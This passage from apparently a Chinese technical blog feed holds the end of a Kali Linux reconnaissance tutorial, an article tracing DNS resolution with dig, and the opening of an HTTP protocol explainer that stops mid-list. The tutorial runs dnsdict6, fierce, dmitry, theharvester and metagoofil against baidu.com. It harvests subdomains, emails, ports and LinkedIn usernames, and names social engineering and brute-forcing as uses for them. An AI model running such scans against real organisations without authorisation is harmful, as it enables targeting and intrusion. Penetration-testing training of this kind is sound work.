<p>前面我们获取的是IPv4的信息，接下来我们使用<strong>dnsdict6**</strong>。**该工具可以获取IPv6地址信息</p>
<h4 id="dnsdict6"><a href="#dnsdict6" class="headerlink" title="dnsdict6"></a><strong>dnsdict6</strong></h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dnsdict6</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/9.png" alt></p>
<p>默认情况下，dnsdict6将使用自带的字典和八个线程</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dnsdict6 baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/10.png" alt></p>
<p>由此可见，是有默认的状态对百度进行IPv6扫描。</p>
<p>同时，我们也可以使用dnsdict6查找域名上的IPv4，使用选项 -4.并且使用-d还可以收集DNS和NS的信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dnsdict6 -4 -d baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/11.png" alt></p>
<h4 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a><strong>fierce</strong></h4><p>fierce 是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务器枚举工具。运用递归的方式来工作。它的工作原理是先通过查询本地DNS服务器来查找目标DNS服务器，然后使用目标DNS服务器来查找子域名。fierce的主要特点就是可以用来地位独立IP空间对应域名和主机名。</p>
<p>启动fierce使用的命令：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#fierce -h</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/12.png" alt></p>
<p>通过一个例子来演示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#fierce  -dns baidu.com -threads 3</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/13.png" alt></p>
<h4 id="DMitry"><a href="#DMitry" class="headerlink" title="DMitry"></a><strong>DMitry</strong></h4><p>DMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 端口扫描</span><br><span class="line">2. whois主机IP和域名信息</span><br><span class="line">3. 从Netcraft.com获取主机信息</span><br><span class="line">4. 子域名</span><br><span class="line">5. 域名中包含的邮件地址</span><br></pre></td></tr></table></figure>

<p>尽管这些信息可以在Kali中通过多种工具获取，但是使用DMitry可以将收集的信息保存在一个文件中，方便查看。</p>
<p>使用DMitry可以使用如下命令：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dmitry</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/14.png" alt></p>
<p>通过一个例子来演示：</p>
<p>这个演示是要获取 whois ，ip，主机信息，子域名，电子邮件。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dmitry -winse baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/15.png" alt></p>
<p>再一个例子，通过dmitry 来扫描网站端口</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dmitry -p baidu.com -f -b</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/16.png" alt></p>
<p>扫描之后我们会发现百度只开放了80端口。（截图只有部分。。。）</p>
<h4 id="Maltego"><a href="#Maltego" class="headerlink" title="Maltego"></a><strong>Maltego</strong></h4><p>Maltego是一个开源的取证工具。它可以挖掘和收集信息。</p>
<p>Maltego是一个图形界面。</p>
<p>Maltego的基础网络特点：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 域名</span><br><span class="line">2. DNS</span><br><span class="line">3. Whois</span><br><span class="line">4. IP地址</span><br><span class="line">5. 网络块</span><br></pre></td></tr></table></figure>

<p>也可以被用于收集相关人员的信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 公司、组织</span><br><span class="line">2. 电子邮件</span><br><span class="line">3. 社交网络关系</span><br><span class="line">4. 电话号码</span><br></pre></td></tr></table></figure>

<p>使用Maltego的命令行如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#maltego</span><br></pre></td></tr></table></figure>

<p>第一次运行会出现启动向导：</p>
<p><img src="/articles/1c43ef2c/17.png" alt></p>
<p><img src="/articles/1c43ef2c/18.png" alt></p>
<p><img src="/articles/1c43ef2c/19.png" alt></p>
<p><img src="/articles/1c43ef2c/20.png" alt></p>
<p><img src="/articles/1c43ef2c/21.png" alt></p>
<p><img src="/articles/1c43ef2c/22.png" alt></p>
<p>通过一个例子演示：</p>
<p>使用快捷键ctrl+T来创建新的项目。然后到Palette选项卡，选择基础设施（Infrastructure），选择域（Domain），如果成功建立会出现paterva.com。可以通过双击paterva.com这个图标进行更改</p>
<p><img src="/articles/1c43ef2c/23.png" alt></p>
<p>如果你右键单击域名，你会看到所有的功能（变换？？）：</p>
<p><img src="/articles/1c43ef2c/24.png" alt></p>
<p>我们使用Other transforms-&gt;DomainToDNSNameSchema 结果如图：</p>
<p><img src="/articles/1c43ef2c/25.png" alt></p>
<p>在对域名的DNS变换后，我们得到了百度的相关信息。你还可以试试其他（变换）功能。</p>
<h4 id="利用搜索引擎"><a href="#利用搜索引擎" class="headerlink" title="利用搜索引擎"></a><strong>利用搜索引擎</strong></h4><p>Kali 工具集中用可以用来收集域，电子邮件等信息的工具，这些工具使用第三方搜索引擎进行信息收集，这样的好处在于我们不用直接访问目标，目标并不知道你的行动。</p>
<h4 id="theharvester"><a href="#theharvester" class="headerlink" title="theharvester"></a><strong>theharvester</strong></h4><p>theharvester是一个电子邮件，用户名和主机名/子域名信息收集工具。它收集来自各种公开的信息来源。最新版本支持的信息来源包括：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. Google</span><br><span class="line">2. Google profiles</span><br><span class="line">3. Bing</span><br><span class="line">4. PGP</span><br><span class="line">5. LinkedIn</span><br><span class="line">6. Yandex</span><br><span class="line">7. People123</span><br><span class="line">8. Jigsaw</span><br></pre></td></tr></table></figure>

<p>使用theharvester 命令行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># theharvester</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/26.png" alt></p>
<p>通过一个例子来演示：</p>
<p>通过bing来收集</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#theharvester -d baidu.com -l 100 -b bing</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/27.png" alt></p>
<p>如果我们想收集目标用户名，我们可以通过LinkedIn.com查找。命令如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#theharvester -d baidu.com -l 100 -b  linkedin</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/28.png" alt></p>
<p>从LinkedIn收集的用户名在后续的测试中将会有很大的用处。例如：社会工程学攻击。</p>
<h4 id="Metagoofil"><a href="#Metagoofil" class="headerlink" title="Metagoofil"></a><strong>Metagoofil</strong></h4><p>Metagoofil是一款利用Google收集信息的工具，目前支持的类型如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. word</span><br><span class="line">2. ppt</span><br><span class="line">3. Excel</span><br><span class="line">4. PDF</span><br></pre></td></tr></table></figure>

<p>使用Metagoofil的命令：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#Metagoofil</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/29.png" alt></p>
<p>通过一个例子来演示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#metagoofil -d baidu.com -l 20 -t doc,pdf -n 5  -f test.html -o test</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/30.png" alt></p>
<p>通过这个工具我们可以看到收集到的资料非常多，如，用户名，路径信息。我们可以通过这些用户名进行暴力破解。</p>
<p>通过生成的HTML版的报告，我们可以非常清晰的看到我们收集的信息种类：</p>
<p><img src="/articles/1c43ef2c/Sun/blog/sunhexo/source/_posts/kali%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/31.png" alt></p>
<p>至此，我们的信息收集工具介绍已经完成。每个渗透目标，想要通过不同的途径获取目标大量信息。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS解析过程详解</title>
    <url>/articles/a8e7b880.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了dns的解析过程，以及对解析过程中所涉及的名词进行说明。</p>
<a id="more"></a>

<h2 id="根域"><a href="#根域" class="headerlink" title="根域"></a>根域</h2><p>就是所谓的“.”，其实我们的网址<a href="http://www.baidu.com在配置当中应该是www.baidu.com.（最后有一点），一般我们在浏览器里输入时会省略后面的点，而这也已经成为了习惯。" target="_blank" rel="noopener">www.baidu.com在配置当中应该是www.baidu.com.（最后有一点），一般我们在浏览器里输入时会省略后面的点，而这也已经成为了习惯。</a></p>
<p>根域服务器我们知道有13台，但是这是错误的观点。</p>
<p>根域服务器只是具有13个IP地址，但机器数量却不是13台，因为这些IP地址借助了<a href="https://zh.wikipedia.org/zh/任播" target="_blank" rel="noopener">任播</a>的技术，所以我们可以在全球设立这些IP的镜像站点，你访问到的这个IP并不是唯一的那台主机。</p>
<p>具体的镜像分布可以参考<a href="https://zh.wikipedia.org/wiki/根域名服務器" target="_blank" rel="noopener">维基百科</a>。这些主机的内容都是一样的</p>
<h2 id="域的划分"><a href="#域的划分" class="headerlink" title="域的划分"></a>域的划分</h2><p>根域下来就是顶级域或者叫一级域，</p>
<p>有两种划分方式，一种互联网刚兴起时的按照行业性质划分的com.，net.等，一种是按国家划分的如cn.，jp.，等。</p>
<p>具体多少你可以自己去查，我们这里不关心。</p>
<p>每个域都会有域名服务器，也叫权威域名服务器。</p>
<p>Baidu.com就是一个顶级域名，而<a href="http://www.baidu.com却不是顶级域名，他是在baidu.com" target="_blank" rel="noopener">www.baidu.com却不是顶级域名，他是在baidu.com</a> 这个域里的一叫做www的主机。</p>
<p>一级域之后还有二级域，三级域，只要我买了一个顶级域，并且我搭建了自己BIND服务器（或者其他软件搭建的）注册到互联网中，那么我就可以随意在前面多加几个域了（当然长度是有限制的）。</p>
<p>比如a.<a href="http://www.baidu.com，在这个网址中，www.baidu.com变成了一个二级域而不是一台主机，主机名是a。" target="_blank" rel="noopener">www.baidu.com，在这个网址中，www.baidu.com变成了一个二级域而不是一台主机，主机名是a。</a></p>
<h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2><p>能提供域名解析的服务器，上面的记录类型可以是A(address)记录，NS记录（name server），MX（mail），CNAME等。</p>
<p>A记录是什么意思呢，就是记录一个IP地址和一个主机名字，比如我这个域名服务器所在的域test.baidu.com，我们知道这是一个二级的域名，然后我在里面有一条A记录,记录了主机为a的IP，查到了就返回给你了。</p>
<p>如果我现在要想baidu.com这个域名服务器查询a.test.baidu.com，那么这个顶级域名服务器就会发现你请求的这个网址在 test.baidu.com这个域中，我这里记录了这个二级域的域名服务器test.baidu.com的NS的IP。我返回给你这个地址你再去查主机 为a的主机把。</p>
<p>这些域内的域名服务器都称为权威服务器，直接提供DNS查询服务。（这些服务器可不会做递归哦）</p>
<h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>那么我们的DNS是怎么解析一个域名的呢？</p>
<ol>
<li><p>现在我有一台计算机，通过ISP接入了互联网，那么ISP就会给我分配一个DNS服务器，<strong>这个DNS服务器不是权威服务器</strong>，而是相当于一个代理的dns解析服务器，他会帮你迭代权威服务器返回的应答，然后把最终查到IP返回给你。</p>
</li>
<li><p>现在的我计算机要向这台ISPDNS发起请求查询<a href="http://www.baidu.com这个域名了，(经网友提醒：这里其实准确来说不是ISPDNS，而应该是用户自己电脑网络设置里的DNS，并不一定是ISPDNS。比如也有可能你手工设置了8.8.8.8)" target="_blank" rel="noopener">www.baidu.com这个域名了，(经网友提醒：这里其实准确来说不是ISPDNS，而应该是用户自己电脑网络设置里的DNS，并不一定是ISPDNS。比如也有可能你手工设置了8.8.8.8)</a></p>
</li>
<li><p>ISPDNS拿到请求后，先检查一下自己的缓存中有没有这个地址，有的话就直接返回。这个时候拿到的ip地址，会被标记为<strong>非权威服务器的应答</strong>。</p>
</li>
<li><p>如果缓存中没有的话，ISPDNS会从<strong>配置文件</strong>里面读取13个根域名服务器的地址（这些地址是不变的，直接在BIND的配置文件中），</p>
</li>
<li><p>然后像其中一台发起请求。</p>
</li>
<li><p>根服务器拿到这个请求后，知道他是com.这个顶级域名下的，所以就会返回com域中的NS记录，一般来说是13台主机名和IP。</p>
</li>
<li><p>然后ISPDNS向其中一台再次发起请求，com域的服务器发现你这请求是baidu.com这个域的，我一查发现了这个域的NS，那我就返回给你，你再去查。</p>
</li>
</ol>
<p>（目前百度有4台baidu.com的顶级域名服务器）。</p>
<ol start="8">
<li><p>ISPDNS不厌其烦的再次向baidu.com这个域的权威服务器发起请求，baidu.com收到之后，查了下有www的这台主机，就把这个IP返回给你了，</p>
</li>
<li><p>然后ISPDNS拿到了之后，将其返回给了客户端，并且把这个保存在高速缓存中。</p>
</li>
</ol>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>下面我们来用 nslookup 这个工具详细来说一下解析步骤：</p>
<p>从上图我们可以看到:</p>
<p>第一行Server是：DNS服务器的主机名–210.32.32.1</p>
<p>第二行Address是： 它的IP地址–210.32.32.1#53</p>
<p>下面的Name是：解析的URL–    <a href="http://www.jsjzx.com" target="_blank" rel="noopener">www.jsjzx.com</a></p>
<p>Address是：解析出来的IP–112.121.162.168</p>
<p>但是也有像百度这样的DNS比较复杂的解析:<br><img src="/articles/a8e7b880/1.png" alt="img"></p>
<p>你会发现百度有一个cname = <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>  的别名。</p>
<p>这是怎么一个过程呢？</p>
<p>我们用dig工具来跟踪一下把（linux系统自带有）</p>
<p>Dig工具会在本地计算机做迭代，然后记录查询的过程。</p>
<p>第一步：是向我这台机器的ISPDNS获取到根域服务区的13个IP和主机名[b-j].root-servers.net.。<br><img src="/articles/a8e7b880/2.png" alt="img"></p>
<p>第二步：是向其中的一台根域服务器（Servername就是末行小括号里面的）发送<a href="http://www.baidu.com的查询请求，他返回了com.顶级域的服务器IP（未显示）和名称，" target="_blank" rel="noopener">www.baidu.com的查询请求，他返回了com.顶级域的服务器IP（未显示）和名称，</a><br><img src="/articles/a8e7b880/3.png" alt="img"></p>
<p>第三步：便向com.域的一台服务器192.33.4.12请求,<a href="http://www.baidu.com，他返回了baidu.com域的服务器IP（未显示）和名称，百度有四台顶级域的服务器" target="_blank" rel="noopener">www.baidu.com，他返回了baidu.com域的服务器IP（未显示）和名称，百度有四台顶级域的服务器</a></p>
<p>​     【此处可以用dig @192.33.4.12 <a href="http://www.baidu.com查看返回的百度顶级域名服务器IP地址】。" target="_blank" rel="noopener">www.baidu.com查看返回的百度顶级域名服务器IP地址】。</a></p>
<p>第四步：向百度的顶级域服务器（202.108.22.220）请求<a href="http://www.baidu.com，他发现这个www有个别名，而不是一台主机，别名是www.a.shifen.com。" target="_blank" rel="noopener">www.baidu.com，他发现这个www有个别名，而不是一台主机，别名是www.a.shifen.com。</a><br><img src="/articles/a8e7b880/4.png" alt="img"></p>
<p>按照一般的逻辑，当dns请求到别名的时候，查询会终止，而是重新发起查询别名的请求，所以此处应该返回的是<a href="http://www.a.shifen.com而已。" target="_blank" rel="noopener">www.a.shifen.com而已。</a></p>
<p>但是为什么返回a.shifen.com的这个域的NS呢？</p>
<p>我们可以尝试下面的这个命令：dig +trace  shifen.com 看看有什么结果。。。。。。。。</p>
<p>你会发现第三步时shifen.com这个顶级域的域名服务器和baidu.com这个域的域名服务器是同一台主机（即：dns.baidu.com）！</p>
<p>当我拿到<a href="http://www.baidu.com的别名www.a.shifen.com的时候，我本来需要重新到com域查找shifen.com域的NS，但是因为这两个域在同一台NS上，所以直接向本机发起了，" target="_blank" rel="noopener">www.baidu.com的别名www.a.shifen.com的时候，我本来需要重新到com域查找shifen.com域的NS，但是因为这两个域在同一台NS上，所以直接向本机发起了，</a></p>
<p>shifen.com域发现请求的<a href="http://www.a.shifen.com是属于a.shifen.com这个域的，" target="_blank" rel="noopener">www.a.shifen.com是属于a.shifen.com这个域的，</a></p>
<p>于是就把a.shifen.com的这个NS和IP返回，让我到a.shifen.com这个域的域名服务器上查询<a href="http://www.a.shifen.com。" target="_blank" rel="noopener">www.a.shifen.com。</a></p>
<p>于是我便从ns X .a.shifen.com中一台拿到了一条A记录，最终的最终也便是<a href="http://www.baidu.com的IP地址了.【此处也可以用dig" target="_blank" rel="noopener">www.baidu.com的IP地址了.【此处也可以用dig</a> +trace <a href="http://www.a.shifen.com】跟踪一下" target="_blank" rel="noopener">www.a.shifen.com】跟踪一下</a></p>
<p>用一个图来说明一下(图中第三步的全世界只有13台是错误的)</p>
<p>以下内容为在虚拟机中搭建local dns服务器得到的实验数据，纠正上述结论</p>
<p>在上面的分析中，我们用dig工具进行了追踪，但是dig没有继续追踪当我们从baidu.com拿到cname和ns2.a.shifen.com的IP之后的事情。</p>
<p>我们就所以然的下结论认为local dns会向ns2.a.shifen.com请求<a href="http://www.a.shifenc.om。" target="_blank" rel="noopener">www.a.shifenc.om。</a></p>
<p>其实这个想法是错误，在自己的本地搭建一个local dns，抓取整个解析过程中是所有包，看看就明白拉。</p>
<p>实际的结果是虽然dns.baidu.com返回了a.shifen.com域的服务器地址和IP，</p>
<p>但是local dns并不是直接向上述返回的IP请求<a href="http://www.a.shifen.com，而是再一次去请求com域，得到shifen.com域的服务器（也就是baidu.com的那四台），" target="_blank" rel="noopener">www.a.shifen.com，而是再一次去请求com域，得到shifen.com域的服务器（也就是baidu.com的那四台），</a></p>
<p>然后又请求<a href="http://www.a.shifen.com，返回a.shifen.com的域的服务器，最后才是去请求www.a.shifen.com，" target="_blank" rel="noopener">www.a.shifen.com，返回a.shifen.com的域的服务器，最后才是去请求www.a.shifen.com，</a></p>
<p>虽然上面已经返回了IP，但是实验的结果就是再走一遍shifen.com域的查询。</p>
<p>上图就是localdns在解析<a href="http://www.baidu.com的抓包全过程。蓝色那条就是在收到cname和响应的a.shifen.com的域名服务器IP地址之后，继续向com域请求shifen.com。" target="_blank" rel="noopener">www.baidu.com的抓包全过程。蓝色那条就是在收到cname和响应的a.shifen.com的域名服务器IP地址之后，继续向com域请求shifen.com。</a><br><img src="/articles/a8e7b880/5.png" alt="img"></p>
<p>这个图充分说明了返回cname的同时也返回了ns2.a.shifen.com的IP。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>①本机向local dns请求<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
<p>②local dns向根域请求<a href="http://www.baidu.com，根域返回com.域的服务器IP" target="_blank" rel="noopener">www.baidu.com，根域返回com.域的服务器IP</a></p>
<p>③向com.域请求<a href="http://www.baidu.com，com.域返回baidu.com域的服务器IP" target="_blank" rel="noopener">www.baidu.com，com.域返回baidu.com域的服务器IP</a></p>
<p>④向baidu.com请求<a href="http://www.baidu.com，返回cname" target="_blank" rel="noopener">www.baidu.com，返回cname</a> <a href="http://www.a.shifen.com和a.shifen.com域的服务器IP" target="_blank" rel="noopener">www.a.shifen.com和a.shifen.com域的服务器IP</a></p>
<p>⑤向root域请求<a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a></p>
<p>⑥向com.域请求<a href="http://www.a.shife.com" target="_blank" rel="noopener">www.a.shife.com</a></p>
<p>⑦向shifen.com请求</p>
<p>⑧向a.shifen.com域请求</p>
<p>⑨拿到<a href="http://www.a.shifen.com的IP" target="_blank" rel="noopener">www.a.shifen.com的IP</a></p>
<p> ⑩localdns返回本机<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> cname <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a> 以及 <a href="http://www.a.shifen.com的IP" target="_blank" rel="noopener">www.a.shifen.com的IP</a></p>
]]></content>
      <categories>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>Dns</tag>
      </tags>
  </entry>
  <entry>
    <title>http协议详解</title>
    <url>/articles/5806080f.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。</p>
<a id="more"></a>

<h2 id="主要特点："><a href="#主要特点：" class="headerlink" title="主要特点："></a>主要特点：</h2><p>1.支持客户/服务器模式。<br>2.简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。<br>3.灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。<br>4.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。<br>5.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</p>
<h2 id="详解篇"><a href="#详解篇" class="headerlink" title="详解篇"></a>详解篇</h2><h4 id="HTTP协议详解之URL篇"><a href="#HTTP协议详解之URL篇" class="headerlink" title="HTTP协议详解之URL篇"></a><strong>HTTP协议详解之URL篇</strong></h4><p>http（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。</p>
<p>HTTP URL (URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息)的格式如下：<br>[<a href="http://host[&quot;:&quot;port\][abs_path](http://host[port][abs_path/)]" target="_blank" rel="noopener">http://host[&quot;:&quot;port\][abs_path](http://host[port][abs_path/)]</a><br>http表示要通过HTTP协议来定位网络资源；host表示合法的Internet主机域名或者IP地址；port指定一个端口号，为空则使用缺省端口80；abs_path指定请求资源的URI；如果URL中没有给出abs_path，那么当它作为请求URI时，必须以“/”的形式给出，通常这个工作浏览器自动帮我们完成。<br>例<br>1、输入：<a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">www.guet.edu.cn</a><br>浏览器自动转换成：<a href="http://www.guet.edu.cn/" target="_blank" rel="noopener">http://www.guet.edu.cn/</a><br>2、http:192.168.0.116:8080/index.jsp </p>
<h4 id="HTTP协议详解之请求篇"><a href="#HTTP协议详解之请求篇" class="headerlink" title="HTTP协议详解之请求篇"></a><strong>HTTP协议详解之请求篇</strong></h4><p>http请求由三部分组成，分别是：请求行、消息报头、请求正文</p>
<p>1、请求行</p>
<p>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本，格式如下：Method Request-URI HTTP-Version CRLF  </p>
<p>其中 Method表示请求方法；Request-URI是一个统一资源标识符；HTTP-Version表示请求的HTTP协议版本；CRLF表示回车和换行（除了作为结尾的CRLF外，不允许出现单</p>
<p>独的CR或LF字符）。</p>
<p>请求方法（所有方法全为大写）有多种，各个方法的解释如下：</p>
<ul>
<li>GET ：请求获取Request-URI所标识的资源</li>
<li>POST：在Request-URI所标识的资源后附加新的数据</li>
<li>HEAD：请求获取由Request-URI所标识的资源的响应消息报头</li>
<li>PUT ： 请求服务器存储一个资源，并用Request-URI作为其标识</li>
<li>DELETE： 请求服务器删除Request-URI所标识的资源</li>
<li>TRACE：请求服务器回送收到的请求信息，主要用于测试或诊断CONNECT  保留将来使用OPTIONS    请求查询服务器的性能，或者查询与资源相关的选项和需求</li>
</ul>
<p>应用举例：<br>GET方法：在浏览器的地址栏中输入网址的方式访问网页时，浏览器采用GET方法向服务器获取资源，例:GET /form.html HTTP/1.1 (CRLF)</p>
<p>POST方法要求被请求服务器接受附在请求后面的数据，常用于提交表单。<br>例：</p>
<p>POST /reg.jsp HTTP/ (CRLF)Accept:image/gif,image/x-xbit,… (CRLF)…HOST:<a href="http://www.guet.edu.cn" target="_blank" rel="noopener">www.guet.edu.cn</a> (CRLF)Content-Length:22 (CRLF)Connection:Keep-Alive (CRLF)Cache-Control:no-cache (CRLF)(CRLF)         //该CRLF表示消息报头已经结束，在此之前为消息报头user=jeffrey&amp;pwd=1234  //此行以下为提交的数据</p>
<p>HEAD方法与GET方法几乎是一样的，对于HEAD请求的回应部分来说，它的HTTP头部中包含的信息与通过GET请求所得到的信息是相同的。利用这个方法，不必传输整个资源</p>
<p>内容，就可以得到Request-URI所标识的资源的信息。该方法常用于<a href="http://lib.csdn.net/base/softwaretest" target="_blank" rel="noopener">测试</a>超链接的有效性，是否可以访问，以及最近是否更新。</p>
<p>2、请求报头后述</p>
<p>3、请求正文(略) </p>
<h4 id="HTTP协议详解之响应篇"><a href="#HTTP协议详解之响应篇" class="headerlink" title="HTTP协议详解之响应篇"></a><strong>HTTP协议详解之响应篇</strong></h4><p>​    在接收和解释请求消息后，服务器返回一个HTTP响应消息。</p>
<p>HTTP响应也是由三个部分组成，分别是：状态行、消息报头、响应正文</p>
<p>1、状态行格式如下：</p>
<p>HTTP-Version </p>
<p>Status-Code</p>
<p>Reason-Phrase CRLF<br>其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发回的响应状态代码；Reason-Phrase表示状态代码的文本描述。<br>状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值：<br>1xx：指示信息–表示请求已接收，继续处理<br>2xx：成功–表示请求已被成功接收、理解、接受<br>3xx：重定向–要完成请求必须进行更进一步的操作<br>4xx：客户端错误–请求有语法错误或请求无法实现<br>5xx：服务器端错误–服务器未能实现合法的请求<br>常见状态代码、状态描述、说明：<br>200 OK      //客户端请求成功<br>400 Bad Request  //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden  //服务器收到请求，但是拒绝提供服务<br>404 Not Found  //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error //服务器发生不可预期的错误<br>503 Server Unavailable  //服务器当前不能处理客户端的请求，一段时间后可能恢复正常<br>eg：HTTP/1.1 200 OK （CRLF）</p>
<p>2、响应报头后述</p>
<p>3、响应正文就是服务器返回的资源的内容 </p>
<h4 id="HTTP协议详解之消息报头篇"><a href="#HTTP协议详解之消息报头篇" class="headerlink" title="HTTP协议详解之消息报头篇"></a><strong>HTTP协议详解之消息报头篇</strong></h4><p>​    HTTP消息由客户端到服务器的请求和服务器到客户端的响应组成。请求消息和响应消息都是由开始行（对于请求消息，开始行就是请求行，对于响应消息，开始行就是状态</p>
<p>行），消息报头（可选），空行（只有CRLF的行），消息正文（可选）组成。</p>
<p>HTTP消息报头包括<strong>普通报头</strong>、<strong>请求报头</strong>、<strong>响应报头</strong>、<strong>实体报头</strong>。<br>每一个报头域都是由名字+“：”+空格+值 组成，消息报头域的名字是大小写无关的。</p>
<p>1、普通报头</p>
<p>在普通报头中，有少数报头域用于所有的请求和响应消息，但并不用于被传输的实体，只用于传输的消息。</p>
<p>Cache-Control   用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机</p>
<p>制），HTTP1.0使用的类似的报头域为Pragma。</p>
<p>请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached;</p>
<p>响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage.</p>
<p>例：为了指示IE浏览器（客户端）不要缓存页面，服务器端的JSP程序可以编写如下：response.sehHeader(“Cache-Control”,”no-cache”);</p>
<p>//response.setHeader(“Pragma”,”no-cache”);作用相当于上述代码，通常两者//合用</p>
<p>这句代码将在发送的响应消息中设置普通报头域：Cache-Control:no-cache</p>
<p>Date普通报头域表示消息产生的日期和时间</p>
<p>Connection普通报头域允许发送指定连接的选项。例如指定连接是连续，或者指定“close”选项，通知服务器，在响应完成后，关闭连接</p>
<p>2、请求报头</p>
<p>请求报头允许客户端向服务器端传递请求的附加信息以及客户端自身的信息。<br>常用的请求报头</p>
<p>Content-Type</p>
<p>MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型。在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。</p>
<p>例如： Content-Type: text/html;charset:utf-8;</p>
<p>常见的媒体格式类型如下：</p>
<ul>
<li>​    text/html ： HTML格式</li>
<li>​    text/plain ：纯文本格式      </li>
<li>​    text/xml ：  XML格式</li>
<li>​    image/gif ：gif图片格式    </li>
<li>​    image/jpeg ：jpg图片格式 </li>
<li>​    image/png：png图片格式</li>
</ul>
<p>以application开头的媒体格式类型：</p>
<ul>
<li>application/xhtml+xml ：XHTML格式</li>
<li>application/soap+xml ：基于soap1.2协议的webservice请求所使用</li>
<li>application/xml     ： XML数据格式</li>
<li>application/atom+xml  ：Atom XML聚合格式    </li>
<li>application/json    ： JSON数据格式</li>
<li>application/pdf       ：pdf格式  </li>
<li>application/msword  ： Word文档格式</li>
<li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li>
